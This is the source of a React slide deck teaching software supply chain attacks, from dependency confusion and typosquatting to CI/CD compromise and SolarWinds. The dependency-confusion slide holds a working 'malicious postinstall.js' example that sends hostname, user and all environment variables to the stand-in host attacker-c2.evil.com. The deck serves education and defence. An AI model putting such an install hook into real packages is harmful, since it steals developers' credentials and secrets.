import SlidePresenter from '../components/SlidePresenter';
import CodeBlock from '../components/CodeBlock';

function YouTubeEmbed({ id, caption }) {
  return (
    <div className="video-embed">
      <iframe
        src={`https://www.youtube.com/embed/${id}`}
        title={caption}
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
        allowFullScreen
      />
      <div className="video-caption">
        <span className="yt-icon">&#9654;</span> {caption}
      </div>
    </div>
  );
}

function FlowDiagram({ steps }) {
  return (
    <div className="flow-diagram">
      {steps.map((s, i) => (
        <span key={i} style={{ display: 'contents' }}>
          <div className={`flow-box ${s.type || ''}`}>
            <h5>{s.label}</h5>
            <p>{s.desc}</p>
          </div>
          {i < steps.length - 1 && <span className={`flow-arrow ${s.arrowType || ''}`}>&rarr;</span>}
        </span>
      ))}
    </div>
  );
}

const slides = [
  {
    tag: 'Part 1 // Introduction',
    title: 'What is a <span class="highlight">Supply Chain Attack</span>?',
    content: (
      <>
        <div className="slide-quote">
          &ldquo;You don't hack the castle &mdash; you <strong>poison the food supply</strong> going into the castle.&rdquo;
        </div>

        <div className="definition-with-image">
          <div className="definition-text">
            <p>
              A <strong>supply chain attack</strong> is a type of cyberattack where hackers don&apos;t target the main
              victim directly &mdash; instead, they compromise a <strong>trusted third-party</strong> (like software vendors,
              libraries, or service providers) to reach many victims at once.
            </p>
            <p>
              <strong>🔍 Simple Idea:</strong> Instead of breaking into your system directly, attackers
              &rarr; <strong>Hack something you trust</strong>, then &rarr; <strong>Use it to infect you</strong>.
            </p>
          </div>
          <div className="definition-image">
            <img src="/supply-chain-attack.png" alt="Supply chain attack diagram" />
          </div>
        </div>

        <p>
          <strong>🍔 Real-world analogy:</strong> Imagine you go to a restaurant and order food.
          The restaurant buys ingredients from a supplier. If the supplier provides <strong>contaminated
          food</strong>, you get sick &mdash; even though the restaurant is trusted. You never dealt with the
          supplier directly. You trusted the restaurant, and the restaurant trusted the supplier.
          Software supply chain attacks work the <em>exact</em> same way &mdash; you trust the package name, the npm registry, the digital signature.
          The attacker poisons the ingredient before it reaches you.
        </p>
        <p>
          In software, we depend on <strong>hundreds of third-party components</strong> &mdash; npm packages, GitHub Actions,
          CDN scripts, Docker images. A supply chain attack doesn't target <em>you</em> directly. It targets something
          <strong> you trust</strong>, then rides that trust straight through your front door.
        </p>

        <div className="illustration">
          <div className="illustration-label">The trust chain attackers exploit</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Attacker', desc: 'Compromises a component', type: 'attacker', arrowType: 'danger' },
              { label: 'Package / Tool', desc: 'Library, Action, or CDN', type: 'compromised', arrowType: 'danger' },
              { label: 'Trusted Channel', desc: 'npm, update server, CI/CD' },
              { label: 'Victim Org', desc: '1,000s of downstream users', type: 'victim' },
            ]} />
          </div>
        </div>

       

        <div className="illustration">
          <div className="illustration-label">Upstream vs Downstream</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'UPSTREAM', desc: 'Attacker gains access to 3rd-party tool', type: 'attacker', arrowType: 'danger' },
              { label: 'Dependency', desc: 'Library, plugin, CI action, CDN script', type: 'compromised', arrowType: 'danger' },
              { label: 'DOWNSTREAM', desc: 'Malware reaches target via browser/device', type: 'victim' },
            ]} />
          </div>
        </div>
      </>
    ),
  },
  {
    tag: 'Part 1 // Why It Matters',
    title: 'Why Supply Chain Attacks are <span class="highlight">Devastating</span>',
    content: (
      <>
        <p>
          Let me put this in perspective. When you run <code>npx create-react-app my-app</code>, you download
          <strong> over 1,400 packages</strong> from 800+ maintainers. Did you audit any of them? No. Nobody does.
          That blind trust is what makes supply chain attacks so devastating.
        </p>
        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>700+</h4>
            <p>Average transitive dependencies in a Node.js app. Each one is a potential entry point for an attacker.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Trust Bypass</h4>
            <p>Your firewall won't stop it. Your antivirus won't flag it. It arrives through <em>trusted</em>, digitally signed channels.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Massive Scale</h4>
            <p>One compromised package = millions of victims. <code>colors.js</code> broke 19,000 projects when its own maintainer sabotaged it in January 2022.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Hard to Detect</h4>
            <p>The SolarWinds backdoor hid inside a legitimately signed update for 9 months. It passed every security check.</p>
          </div>
        </div>
        <p><strong>These aren't hypothetical threats. Here are real numbers:</strong></p>
        <ul>
          <li><strong>SolarWinds (2020):</strong> 18,000+ organizations compromised including the US Treasury, Homeland Security, and Microsoft. Attackers were inside for 9 months.</li>
          <li><strong>tj-actions (2025):</strong> A single compromised GitHub Action cascaded to 23,000+ repositories, leaking CI/CD secrets at scale.</li>
          <li><strong>Trivy Action (2026):</strong> A <em>security scanner</em> was turned into a weapon &mdash; 10,000+ CI/CD workflows leaked credentials. The irony is the tool you trusted to find vulnerabilities <em>was</em> the vulnerability.</li>
        </ul>
      </>
    ),
  },
  {
    tag: 'Part 1 // Taxonomy',
    title: 'Attack Surface <span class="highlight">Taxonomy</span>',
    content: (
      <>
        <div className="slide-quote">
          Think of software delivery as a river flowing from developer to user. Attackers can
          <strong> poison the water</strong> at six different points along the way.
        </div>

        <div className="illustration">
          <div className="illustration-label">The six attack surfaces — from code to user</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Source Code', desc: 'Where code is written', type: 'attacker', arrowType: 'danger' },
              { label: 'Dependencies', desc: 'What code relies on', type: 'compromised', arrowType: 'danger' },
              { label: 'Build System', desc: 'How code is compiled', type: 'compromised', arrowType: 'danger' },
              { label: 'Distribution', desc: 'How code is delivered', type: 'victim', arrowType: 'danger' },
              { label: 'Browser', desc: 'Where code runs', type: 'victim', arrowType: 'danger' },
              { label: 'Client-Side', desc: 'What users interact with', type: 'attacker' },
            ]} />
          </div>
        </div>

        <div className="taxonomy taxonomy-enhanced">
          <div className="taxonomy-cat">
            <div className="taxonomy-icon">&#128187;</div>
            <h4>Source Code</h4>
            <p className="taxonomy-desc">Attackers infiltrate the repository itself</p>
            <ul>
              <li><strong>Compromised repo</strong> &mdash; steal maintainer credentials</li>
              <li><strong>Malicious commits</strong> &mdash; sneak code past review</li>
              <li><strong>Submodule attacks</strong> &mdash; redirect git references</li>
            </ul>
            <div className="taxonomy-example">e.g. PHP backdoor attempt (2021)</div>
          </div>
          <div className="taxonomy-cat">
            <div className="taxonomy-icon">&#128230;</div>
            <h4>Dependencies</h4>
            <p className="taxonomy-desc">Poison the packages your app relies on</p>
            <ul>
              <li><strong>Dependency confusion</strong> &mdash; public name hijacks private</li>
              <li><strong>Typosquatting</strong> &mdash; <code>lodahs</code> instead of <code>lodash</code></li>
              <li><strong>Malicious updates</strong> &mdash; trusted package turns hostile</li>
              <li><strong>Transitive deps</strong> &mdash; attack a dependency&apos;s dependency</li>
            </ul>
            <div className="taxonomy-example">e.g. event-stream, crossenv, Birsan</div>
          </div>
          <div className="taxonomy-cat">
            <div className="taxonomy-icon">&#9881;&#65039;</div>
            <h4>Build System</h4>
            <p className="taxonomy-desc">Tamper with the factory that produces your software</p>
            <ul>
              <li><strong>CI/CD compromise</strong> &mdash; inject code via pipelines</li>
              <li><strong>Build tool poisoning</strong> &mdash; modify compiler/bundler</li>
              <li><strong>Signing bypass</strong> &mdash; forge or steal certificates</li>
            </ul>
            <div className="taxonomy-example">e.g. SolarWinds SUNSPOT, tj-actions</div>
          </div>
          <div className="taxonomy-cat">
            <div className="taxonomy-icon">&#128666;</div>
            <h4>Distribution</h4>
            <p className="taxonomy-desc">Intercept software on its way to the user</p>
            <ul>
              <li><strong>Update servers</strong> &mdash; replace files on official servers</li>
              <li><strong>Registry mirrors</strong> &mdash; serve altered packages</li>
              <li><strong>Cache poisoning</strong> &mdash; corrupt CDN/proxy caches</li>
            </ul>
            <div className="taxonomy-example">e.g. Codecov bash uploader (2021)</div>
          </div>
          <div className="taxonomy-cat">
            <div className="taxonomy-icon">&#127760;</div>
            <h4>Browser / Runtime</h4>
            <p className="taxonomy-desc">Weaponize the environment that executes code</p>
            <ul>
              <li><strong>Malicious JS libs</strong> &mdash; hijack popular CDN scripts</li>
              <li><strong>Browser extensions</strong> &mdash; extensions with hidden payloads</li>
              <li><strong>Compromised CDNs</strong> &mdash; serve altered files globally</li>
            </ul>
            <div className="taxonomy-example">e.g. polyfill.io domain takeover (2024)</div>
          </div>
          <div className="taxonomy-cat">
            <div className="taxonomy-icon">&#128179;</div>
            <h4>Client-Side</h4>
            <p className="taxonomy-desc">Attack what the end-user sees and touches</p>
            <ul>
              <li><strong>Magecart</strong> &mdash; skim credit cards from checkout pages</li>
              <li><strong>Watering hole</strong> &mdash; compromise sites targets visit</li>
              <li><strong>Cryptojacking</strong> &mdash; mine crypto in users&apos; browsers</li>
            </ul>
            <div className="taxonomy-example">e.g. British Airways (380K cards stolen)</div>
          </div>
        </div>
      </>
    ),
  },
 
  

  {
    tag: 'Part 1 // MITRE ATT&CK',
    title: '<span class="highlight">MITRE ATT&CK</span> T1195',
    content: (
      <>
        <div className="definition-with-image">
          <div className="definition-text">
            <p>
              <strong>MITRE ATT&CK</strong> (Adversarial Tactics, Techniques &amp; Common Knowledge) is a
              globally recognized <strong>knowledge base of real-world attacker behavior</strong>. It catalogs
              <em>how</em> adversaries break in, move around, and steal data &mdash; organized into
              <strong> tactics</strong> (the goal) and <strong>techniques</strong> (the method). Security teams
              use it to map threats, test defenses, and speak a common language about attacks.
            </p>
            <p>
              Supply Chain Compromise is cataloged as <strong>T1195</strong> under the
              <strong> Initial Access</strong> tactic &mdash; meaning it&apos;s one of the ways attackers
              get their <em>first foothold</em> into a target network.
            </p>
          </div>
          <div className="definition-image">
            <img
              src="https://www.attackiq.com/wp-content/uploads/2022/05/mitre-attack-1.png"
              alt="MITRE ATT&CK framework matrix"
            />
          </div>
        </div>

        <table className="slide-table">
          <thead>
            <tr>
              <th>ID</th>
              <th>Sub-Technique</th>
              <th>Description</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><code>T1195.001</code></td>
              <td>Dependencies &amp; Dev Tools</td>
              <td>Manipulating packages, libraries, or development tools</td>
            </tr>
            <tr>
              <td><code>T1195.002</code></td>
              <td>Software Supply Chain</td>
              <td>Manipulating update servers, build pipelines, delivery mechanisms</td>
            </tr>
            <tr>
              <td><code>T1195.003</code></td>
              <td>Hardware Supply Chain</td>
              <td>Manipulating hardware components or firmware</td>
            </tr>
          </tbody>
        </table>
        <p>
          <strong>Related techniques:</strong> T1059 (Scripting), T1071 (Application Layer Protocol),
          T1027 (Obfuscation), T1078 (Valid Accounts)
        </p>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Types',
    title: 'Common <span class="highlight">Attack Types</span>',
    content: (
      <>
        <p>
          Now that we&apos;ve mapped <em>where</em> attacks happen across the supply chain, let&apos;s
          look at the specific <strong>techniques attackers use</strong> &mdash; each one illustrated
          with real-world incidents.
        </p>

        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>A &mdash; Dependency Confusion</h4>
            <p>Public package name hijacks a private one via higher version number. Birsan earned <strong>$130K+</strong> from Apple, Microsoft, PayPal.</p>
          </div>
          <div className="slide-grid-item">
            <h4>B &mdash; Typosquatting</h4>
            <p>Register misspelled package names and wait for typos. <code>crossenv</code> stole credentials from <strong>700+ devs</strong>.</p>
          </div>
          <div className="slide-grid-item">
            <h4>C &mdash; Compromised Packages</h4>
            <p>Take over a trusted package and push a malicious update. <code>event-stream</code> was weaponized to steal Bitcoin.</p>
          </div>
          <div className="slide-grid-item">
            <h4>D &mdash; CI/CD Pipeline Attacks</h4>
            <p>Compromise the build robot that holds all the secrets. <code>tj-actions</code> leaked secrets from <strong>23,000+ repos</strong>.</p>
          </div>
          <div className="slide-grid-item">
            <h4>E &mdash; Build Process Compromise</h4>
            <p>Inject a backdoor during compilation &mdash; source stays clean. SolarWinds shipped a trojanized DLL to <strong>18,000 orgs</strong>.</p>
          </div>
          <div className="slide-grid-item">
            <h4>F &mdash; Browser-Based Attacks</h4>
            <p>Compromise CDN scripts, extensions, or checkout pages. British Airways lost <strong>380K credit cards</strong> in 15 days.</p>
          </div>
        </div>

        <div className="slide-quote">
          We&apos;ll now walk through each one in detail &mdash; how it works, why it succeeds, and what real damage it caused.
        </div>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type A',
    title: '<span class="highlight">Dependency Confusion</span>',
    content: (
      <>
        <div className="definition-with-image">
          <div className="definition-text">
            <p><strong>What is it?</strong></p>
            <ul>
              <li>Companies use <strong>private registries</strong> for internal packages (e.g., <code>csec-auth-utils@1.2.3</code>)</li>
              <li>Attacker publishes the <strong>same name</strong> on public npm with a higher version (<code>@99.0.0</code>)</li>
              <li>Package manager picks <strong>highest version</strong> &rarr; installs the attacker&apos;s package</li>
              <li><code>postinstall</code> hooks run <strong>automatically</strong> &mdash; instant code execution</li>
            </ul>
          </div>
          <div className="definition-image">
            <img
              src="https://cdn.activestate.com/wp-content/uploads/2022/12/DependencyConfusion-QR.png"
              alt="Dependency Confusion diagram"
            />
          </div>
        </div>

        <div className="illustration">
          <div className="illustration-label">How version resolution is exploited</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Private Registry', desc: 'csec-auth-utils@1.2.3', type: '' },
              { label: 'npm install', desc: 'resolves highest version', type: 'compromised', arrowType: '' },
              { label: 'Public Registry', desc: 'csec-auth-utils@99.0.0', type: 'attacker', arrowType: 'danger' },
              { label: 'Victim Machine', desc: 'Installs v99.0.0!', type: 'victim' },
            ]} />
          </div>
        </div>

        <p><strong>Why it works:</strong></p>
        <ul>
          <li><strong>Naming is global</strong> &mdash; anyone can publish any unscoped name on public npm</li>
          <li><strong>Highest version wins</strong> &mdash; <code>^1.0.0</code> allows up to <code>99.0.0</code></li>
          <li><strong>Lifecycle hooks are automatic</strong> &mdash; <code>postinstall</code> runs with zero user prompt</li>
          <li><strong>Internal names leak easily</strong> &mdash; source maps, error logs, leaked <code>package.json</code></li>
        </ul>

        <p><strong>Real-world &mdash; Alex Birsan (Feb 2021):</strong></p>
        <ul>
          <li><strong>Step 1:</strong> Found internal package names in leaked files &amp; source maps</li>
          <li><strong>Step 2:</strong> Published same names on public npm as <code>v99.0.0</code> with a DNS callback</li>
          <li><strong>Step 3:</strong> Devs ran <code>npm install</code> &rarr; npm picked the higher public version</li>
          <li><strong>Step 4:</strong> <code>postinstall</code> ran automatically on build servers at <strong>Apple, Microsoft, PayPal, Tesla, Uber</strong></li>
          <li><strong>Result:</strong> <strong>$130,000+</strong> in bug bounties from a single technique</li>
        </ul>

        <CodeBlock
          language="javascript"
          filename="malicious postinstall.js"
          code={`const os = require('os');
const https = require('https');

// Runs AUTOMATICALLY during npm install — no user consent
const data = JSON.stringify({
  hostname: os.hostname(),
  user: os.userInfo().username,
  cwd: process.cwd(),
  env: process.env  // AWS_SECRET_KEY, NPM_TOKEN, DB_PASSWORD...
});

https.request({
  hostname: 'attacker-c2.evil.com',
  path: '/exfil', method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}).end(data);
// The developer sees "npm install" succeed normally.
// They have no idea this script just ran.`}
        />

        <div className="slide-quote">
          Birsan: &ldquo;Squatting valid internal package names was a nearly sure-fire method to get into
          the networks of some of the biggest tech companies out there.&rdquo;
        </div>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type B',
    title: '<span class="highlight">Typosquatting</span>',
    content: (
      <>
        <div className="definition-with-image">
          <div className="definition-text">
            <p><strong>What is it?</strong></p>
            <ul>
              <li>The <strong>simplest</strong> supply chain attack &mdash; works embarrassingly well</li>
              <li>Attacker registers <strong>misspelled package names</strong> and waits for typos</li>
              <li>Fake package <strong>re-exports the real one</strong> &mdash; everything works normally</li>
              <li>Meanwhile, credentials are <strong>silently exfiltrated</strong> in the background</li>
            </ul>
          </div>
          <div className="definition-image">
            <img
              src="https://media.licdn.com/dms/image/v2/C4D12AQGYpv9dXCgpjw/article-cover_image-shrink_600_2000/article-cover_image-shrink_600_2000/0/1616425743288?e=2147483647&v=beta&t=bSHhmRMWMnsQNozKjisxJ0v17CMIEg5JSBGl76LSBvo"
              alt="Typosquatting methods illustration"
            />
          </div>
        </div>

        <p><strong>Real incident &mdash; crossenv (2017):</strong></p>
        <ul>
          <li>Popular package: <code>cross-env</code> (with hyphen) &mdash; <strong>1.5M weekly downloads</strong></li>
          <li>Attacker published: <code>crossenv</code> (no hyphen) &mdash; same README, same API</li>
          <li>Silently stole <strong>all environment variables</strong> (npm tokens, AWS keys, DB passwords)</li>
          <li>Downloaded <strong>700+ times</strong> over 2 weeks before discovery</li>
        </ul>

        <table className="slide-table">
          <thead>
            <tr><th>Legitimate</th><th>Typosquat</th><th>Technique</th><th>What Catches Devs</th></tr>
          </thead>
          <tbody>
            <tr><td><code>lodash</code></td><td><code>lodahs</code></td><td>Character swap</td><td>Typing fast, not looking</td></tr>
            <tr><td><code>cross-env</code></td><td><code>crossenv</code></td><td>Missing hyphen</td><td>Forgetting the separator</td></tr>
            <tr><td><code>colors</code></td><td><code>colros</code></td><td>Letter transposition</td><td>Common typo pattern</td></tr>
            <tr><td><code>express</code></td><td><code>expresss</code></td><td>Extra letter</td><td>Double-tap on keyboard</td></tr>
            <tr><td><code>@angular/core</code></td><td><code>angular-core</code></td><td>Scope confusion</td><td>Forgetting the @ scope</td></tr>
          </tbody>
        </table>

        <p><strong>Why you don&apos;t notice:</strong></p>
        <ul>
          <li>Fake package internally does <code>require(&apos;cross-env&apos;)</code> &mdash; <strong>tests pass, app runs fine</strong></li>
          <li>Developer has <strong>zero indication</strong> anything is wrong</li>
        </ul>

        <p><strong>Scale:</strong></p>
        <ul>
          <li>Checkmarx (2023) found <strong>14,000+ typosquat packages</strong> on npm alone</li>
          <li>Attackers automate this &mdash; generate all 1-character misspellings of <strong>top 1,000 packages</strong> in bulk</li>
          <li>PyPI and RubyGems are equally affected</li>
        </ul>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type C',
    title: '<span class="highlight">Compromised Packages</span> & Malicious Updates',
    content: (
      <>
        <div className="definition-with-image">
          <div className="definition-text">
            <p><strong>What is it?</strong></p>
            <ul>
              <li>The <strong>most dangerous</strong> supply chain vector &mdash; weaponizes <em>legitimate trust</em></li>
              <li>Attacker <strong>takes over an existing, popular package</strong> (not a new/fake one)</li>
              <li>Thousands of projects <strong>already depend on it</strong> &mdash; instant reach</li>
              <li>Malicious update arrives through <strong>official, signed channels</strong></li>
            </ul>
          </div>
          <div className="definition-image">
            <img
              src="https://www.csoonline.com/wp-content/uploads/2025/07/4026380-0-32873100-1753185152-shutterstock_680078968.jpg?quality=50&strip=all&w=1024"
              alt="Compromised package supply chain attack"
            />
          </div>
        </div>

        <p><strong>The event-stream story (2018):</strong></p>
        <ul>
          <li><code>event-stream</code> had <strong>2M weekly downloads</strong>, maintained by Dominic Tarr (burned out, unpaid)</li>
          <li>A user "right9ctrl" offered to help &rarr; Tarr <strong>handed over publishing rights</strong></li>
          <li>right9ctrl added <code>flatmap-stream</code> &mdash; contained <strong>AES-encrypted malicious code</strong> in a test file</li>
          <li>Decryption key derived from <strong>Copay Bitcoin wallet&apos;s</strong> <code>package.json</code> description field</li>
          <li>Payload <strong>only activated inside Copay</strong> &mdash; everywhere else it was dormant</li>
          <li>When triggered: intercepted <strong>Bitcoin private keys</strong> during transaction signing</li>
        </ul>

        <div className="slide-quote">
          Dominic Tarr: &ldquo;I don't get any reward for maintaining this module. I don't even
          use it anymore. He emailed me and offered to maintain it, so I gave it to him.
          He seemed enthusiastic.&rdquo;
        </div>

        <p><strong>Why this pattern is terrifying:</strong></p>
        <ul>
          <li><strong>Legitimate history</strong> &mdash; years of real commits, thousands of stars &rarr; audit tools see a "trusted" package</li>
          <li><strong>Signed &amp; checksummed</strong> &mdash; published through npm&apos;s official channel by an authorized maintainer</li>
          <li><strong>Auto-updated</strong> &mdash; Dependabot / Renovate could auto-merge the malicious update without human review</li>
          <li><strong>Targeted payload</strong> &mdash; only activated in Copay; everyone else&apos;s tests passed normally</li>
          <li><strong>Discovered by accident</strong> &mdash; a curious developer spotted the suspicious dependency during review</li>
        </ul>

        <p><strong>It keeps happening:</strong></p>
        <ul>
          <li><strong>colors.js / faker.js (2022)</strong> &mdash; maintainer Marak Squires deliberately sabotaged his own packages</li>
          <li>Added an <strong>infinite loop</strong> that printed garbage &rarr; <strong>19,000+ projects</strong> broke overnight</li>
          <li>Different motive (protest vs. theft), <strong>same lesson:</strong> maintainers are often one person, unpaid, one bad day from chaos</li>
        </ul>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type D',
    title: '<span class="highlight">CI/CD Pipeline</span> attacks',
    content: (
      <>
        <div className="definition-with-image">
          <div className="definition-text">
            <p><strong>What is it?</strong></p>
            <ul>
              <li>CI/CD (GitHub Actions, Jenkins) is <strong>the robot that builds &amp; deploys your app</strong></li>
              <li>It holds <strong>all the keys</strong>: npm tokens, AWS credentials, DB passwords</li>
              <li>Makes it the <strong>single most powerful target</strong> in your project</li>
              <li>If attackers trick the robot into running <em>their</em> code &rarr; they get <strong>every secret</strong></li>
            </ul>
          </div>
          <div className="definition-image">
            <img
              src="/cicd-loop.png"
              alt="CI/CD infinity loop diagram"
            />
          </div>
        </div>

        <p><strong>The CI/CD loop &mdash; stage by stage:</strong></p>
        <ul>
          <li><strong>CI (Continuous Integration)</strong> &mdash; the left loop:
            <ul>
              <li><strong>Code</strong> &rarr; developer pushes to GitHub</li>
              <li><strong>Build</strong> &rarr; app is compiled/bundled automatically (<code>npm run build</code>)</li>
              <li><strong>Test</strong> &rarr; automated tests run to catch bugs before they ship</li>
            </ul>
          </li>
          <li><strong>CD (Continuous Deployment)</strong> &mdash; the right loop:
            <ul>
              <li><strong>Release</strong> &rarr; a tested artifact is tagged for production</li>
              <li><strong>Deploy</strong> &rarr; pushed to the server (Vercel, AWS, Render&hellip;)</li>
              <li><strong>Operate</strong> &rarr; app serves real users</li>
              <li><strong>Monitor</strong> &rarr; logs &amp; alerts track health; findings feed back into <strong>Plan</strong></li>
            </ul>
          </li>
        </ul>
        <p>
          Example: you push a fix to <code>Theory.jsx</code> &rarr; CI installs deps, lints, tests, builds &rarr;
          if everything passes, CD deploys it automatically. <strong>One push, zero manual steps.</strong>
        </p>

        <div className="illustration">
          <div className="illustration-label">How a CI/CD attack works — step by step</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: '1. Steal a key', desc: "Get a maintainer's login token", type: 'attacker', arrowType: 'danger' },
              { label: '2. Swap the code', desc: 'Move git tag to evil commit', type: 'compromised', arrowType: 'danger' },
              { label: '3. CI runs it', desc: 'Robot executes evil code', type: 'victim', arrowType: 'danger' },
              { label: '4. Secrets leak', desc: 'Tokens sent to attacker', type: 'attacker' },
            ]} />
          </div>
        </div>

        <p><strong>Real incident -- tj-actions (March 2025):</strong></p>
        <ul>
          <li><code>tj-actions/changed-files</code> used by <strong>23,000+ projects</strong></li>
          <li>Attackers <strong>stole the maintainer&apos;s PAT</strong> (Personal Access Token)</li>
          <li>Moved version tag <code>@v35</code> to point at <strong>malicious code</strong></li>
          <li>Every project using <code>@v35</code> unknowingly <strong>ran the attacker&apos;s code</strong> in CI</li>
          <li>It <strong>printed out every secret</strong> &rarr; attacker used those to compromise more Actions</li>
          <li>One breach <strong>cascaded into many</strong></li>
        </ul>

        <p><strong>It happened again -- Trivy (March 2026):</strong></p>
        <ul>
          <li>Using secrets stolen from tj-actions, attackers poisoned <code>aquasecurity/trivy-action</code></li>
          <li>A <strong>security scanner</strong> turned into a weapon (the tool meant to <em>find</em> vulns became one)</li>
          <li><strong>10,000+</strong> CI pipelines leaked credentials</li>
          <li>Stolen npm tokens used to publish <strong>malware with blockchain C2</strong> &mdash; nearly impossible to shut down</li>
        </ul>

        <CodeBlock
          language="yaml"
          filename=".github/workflows/ci.yml — VULNERABLE vs SAFE"
          code={`# VULNERABLE — tag is just a label, attacker can move it:
- uses: tj-actions/changed-files@v35

# SAFE — SHA is a unique fingerprint, nobody can change it:
- uses: tj-actions/changed-files@abc123def456`}
        />

        <p><strong>The one-line fix:</strong></p>
        <ul>
          <li>Pin Actions to a <strong>SHA hash</strong> instead of a version tag</li>
          <li>A tag like <code>@v4</code> is a sticky note &mdash; anyone with access can move it</li>
          <li>A SHA like <code>@abc123...</code> is a fingerprint &mdash; <strong>always points to the same code, forever</strong></li>
          <li>If everyone had done this, <strong>both attacks would have failed</strong></li>
        </ul>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type E',
    title: '<span class="highlight">Build Process</span> Compromise',
    content: (
      <>
        <p><strong>What is it?</strong></p>
        <ul>
          <li>Source code is clean, code review finds nothing, tests pass</li>
          <li>But the <strong>build server is tampered with</strong> &mdash; it injects a backdoor during compilation</li>
          <li>The compiled binary ships with malware that <strong>never existed in the repo</strong></li>
          <li>Widely considered the <strong>hardest supply chain attack to detect</strong></li>
        </ul>

        <div className="slide-quote">
          &ldquo;You write an essay, proofread it carefully, and hand it to the printer.
          The printer <strong>secretly changes a paragraph</strong>, prints 18,000 copies,
          then puts the original back. Nobody ever sees the change &mdash;
          except every reader.&rdquo;
        </div>

        <div className="illustration">
          <div className="illustration-label">The concept at a glance</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Clean Repo', desc: 'No malicious code anywhere', type: '' },
              { label: 'Build Server', desc: 'Secretly tampered with', type: 'attacker', arrowType: 'danger' },
              { label: 'Compiled Binary', desc: 'Backdoor baked in', type: 'compromised', arrowType: 'danger' },
              { label: 'Signed Update', desc: 'Looks 100% legitimate', type: 'victim' },
            ]} />
          </div>
        </div>

        <p><strong>SolarWinds incident (2020):</strong></p>
        <ul>
          <li><strong>Who:</strong> APT29 / Cozy Bear &mdash; Russian intelligence (SVR)</li>
          <li><strong>Target:</strong> SolarWinds Orion &mdash; network monitoring used by <strong>300,000 customers</strong> (Fortune 500, US gov agencies)</li>
          <li><strong>Key insight:</strong> they never touched the source code (code review would catch that) &mdash; they poisoned the <strong>build server</strong> instead</li>
          <li><strong>Patience:</strong> spent <strong>months</strong> doing recon inside SolarWinds&apos; network before ever touching the build system</li>
          <li>This is the attack that put &ldquo;supply chain&rdquo; on every CISO&apos;s radar</li>
        </ul>
      </>
    ),
  },
  {
    tag: 'Part 1 // SUNSPOT — How It Worked',
    title: 'SUNSPOT: The <span class="highlight">4-Step Trick</span>',
    content: (
      <>
        <p><strong>SUNSPOT</strong> &mdash; the implant APT29 planted on the build server:</p>
        <ul>
          <li>Didn&apos;t run all the time &mdash; <strong>waited</strong> for the exact moment Orion was being compiled</li>
          <li>Did its work in <strong>seconds</strong>, then covered its tracks</li>
        </ul>

        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>Step 1: Watch</h4>
            <p>SUNSPOT quietly monitored for <code>MsBuild.exe</code> processes on the build server. The moment Orion started compiling, it woke up.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Step 2: Swap</h4>
            <p>It replaced <strong>a single source file</strong> with a backdoored version containing the SUNBURST payload. Just one file out of thousands &mdash; that&apos;s all it took.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Step 3: Compile</h4>
            <p>The build server compiled Orion normally &mdash; including the swapped file. The backdoor was now <strong>baked into the DLL</strong>.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Step 4: Restore</h4>
            <p>After compilation finished, SUNSPOT <strong>put the original file back</strong>. Developers checking the repo saw nothing. No diff. No trace. No evidence.</p>
          </div>
        </div>

        <div className="illustration">
          <div className="illustration-label">SUNSPOT&apos;s operation — the &ldquo;evil printer&rdquo;</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: '1. WATCH', desc: 'Monitors for MsBuild.exe', type: 'attacker', arrowType: 'danger' },
              { label: '2. SWAP', desc: 'Replaces source file mid-compile', type: 'compromised', arrowType: 'danger' },
              { label: '3. BUILD', desc: 'Backdoor compiled into DLL', type: 'compromised', arrowType: 'danger' },
              { label: '4. RESTORE', desc: 'Original file put back — no trace', type: 'attacker' },
            ]} />
          </div>
        </div>

        <p><strong>The result:</strong></p>
        <ul>
          <li>A trojanized DLL, <strong>legitimately signed</strong> by SolarWinds&apos; own code-signing certificate</li>
          <li>No developer ever saw malicious code in the repo</li>
          <li>Backdoor existed <em>only</em> in the compiled binary &rarr; shipped to <strong>18,000 customers</strong></li>
        </ul>

        <p><strong>Why not just modify the repo?</strong></p>
        <ul>
          <li>Code review would catch it</li>
          <li>SUNSPOT only existed during the <strong>brief window of compilation</strong> &mdash; then erased its tracks completely</li>
        </ul>
      </>
    ),
  },
  {
    tag: 'Part 1 // SUNBURST — Staying Hidden',
    title: 'SUNBURST: How It <span class="highlight">Stayed Hidden</span> for 9 Months',
    content: (
      <>
        <p>
          Getting the backdoor into the binary was only half the job. The payload
          (<strong>SUNBURST</strong>) also had to <strong>avoid detection</strong> once installed
          on thousands of networks. It used four techniques:
        </p>

        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>2-Week Sleep</h4>
            <p>After installation, it <strong>did nothing for 12&ndash;14 days</strong>. Testing and QA never saw malicious behavior &mdash; it only woke up in production.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Disguised Traffic</h4>
            <p>Command-and-control calls were <strong>disguised as normal Orion API traffic</strong>. To a network analyst, it looked like routine SolarWinds telemetry.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Anti-Analysis</h4>
            <p>It <strong>checked for security tools</strong> (Wireshark, Fiddler, debuggers) and <em>shut itself off</em> if it detected anyone watching.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Signed &amp; Trusted</h4>
            <p>The DLL was signed with <strong>SolarWinds&apos; real certificate</strong>. Every antivirus, firewall, and allowlist treated it as legitimate software.</p>
          </div>
        </div>

